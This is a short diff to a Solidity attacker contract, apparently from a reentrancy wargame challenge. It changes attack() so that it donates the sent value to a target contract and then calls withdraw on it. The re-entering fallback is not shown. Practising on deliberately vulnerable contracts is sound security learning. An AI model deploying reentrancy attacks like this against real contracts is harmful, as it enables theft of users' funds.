@@ -17,9 +17,10 @@ contract Reentrance {
     targetContract = IReentrance(payable(targetAddress));
   }
 
-  function attack() public {
-    targetContract.donate{value: 0.001 ether}(exitAddress);
-    targetContract.withdraw(address(targetContract).balance); 
+  function attack() external payable {
+    targetContract.donate{value: msg.value}(exitAddress);
+    //targetContract.withdraw(address(targetContract).balance); 
+    targetContract.withdraw(msg.value); 
   }
 
 }
